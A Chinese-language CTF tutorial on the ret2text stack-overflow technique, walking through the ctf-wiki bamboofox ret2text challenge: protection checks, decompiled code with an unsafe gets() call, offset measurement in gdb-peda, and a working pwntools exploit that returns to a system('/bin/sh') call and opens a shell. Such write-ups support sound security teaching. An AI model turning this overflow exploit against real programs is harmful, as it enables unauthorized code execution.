# 基本ROP-ret2text

> 参考：[ret2text-Cyberangel](https://www.yuque.com/cyberangel/rg9gdm/tka83f) | [手动测量变量溢出长度-Cyberangel](https://www.yuque.com/cyberangel/rg9gdm/yevixw)
>
> 下载：[ret2text](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/ret2text/bamboofox-ret2text)



**原理**

控制程序执行本身代码（.text），寻找危险函数如`system("/bin/sh")`、`execve("/bin/sh")`



**利用前提**

开启NX，表示题目包含危险函数，不需要自己构造shellcode



**编译**

```shell
gcc -fno-stack-protector -z execstack -z norelro -no-pie ret2text.c -o ret2text
```



**检查保护**

```shell
$ checksec --file=ret2text
[*] '/home/kali/Desktop/ret2text'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```



**IDA反编译**

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s[100]; // [esp+1Ch] [ebp-64h] BYREF

  setvbuf(stdout, 0, 2, 0);
  setvbuf(_bss_start, 0, 1, 0);
  puts("There is something amazing here, do you know anything?");
  gets(s);
  printf("Maybe I will tell you next time !");
  return 0;
}
```



其中发现危险函数`secure()`中存在`system("/bin/sh")`

```c
void secure()
{
  unsigned int v0; // eax
  int input; // [esp+18h] [ebp-10h] BYREF
  int secretcode; // [esp+1Ch] [ebp-Ch]

  v0 = time(0);
  srand(v0);
  secretcode = rand();
  __isoc99_scanf(&unk_8048760, &input);
  if ( input == secretcode )
    system("/bin/sh");
}
```



查看汇编代码，定位system函数地址，接下来只要控制程序返回至`0x0804863A`，就可以getshell

```shell
.text:08048638                 jnz     short locret_8048646
.text:0804863A                 mov     dword ptr [esp], offset command ; "/bin/sh"
.text:08048641                 call    _system
```



**手动测量溢出长度**

`cyclic 200`生成200长度无序字符串，传入栈中判断溢出，先使用**peda-gdb**打开ret2text

```shell
$ gdb ret2text	# 打开ret2text
gdb-peda$ start	# 开始调试，中断在main函数
gdb-peda$ c		# 按c继续执行，接着将200位字符串输入
Invalid $PC address: 0x62616164	# 得到溢出字符，每两位数字转换为10进制，再对应ASCII得到字符为baad
$ cyclic -l 0x62616164	# 得到溢出字符前面位数112

```



**EXP**

```python
from pwn import *
p = process('./ret2text')
target = 0x804863a
p.sendline('A' * 112 + p32(target).decode('unicode_escape'))
p.interactive()
```



保存为`exp.py`，使用Python3执行，成功getshell

```shell
$ python 1.py 
[+] Starting local process './ret2text': pid 6219
/home/kali/Desktop/1.py:4: BytesWarning: Text is not bytes; assuming ISO-8859-1, no guarantees. See https://docs.pwntools.com/#bytes
  p.sendline('A' * 112 + p32(target).decode('unicode_escape'))
[*] Switching to interactive mode
There is something amazing here, do you know anything?
Maybe I will tell you next time !

$ ls
1.py  core  peda-session-ret2text.txt  ret2text
```

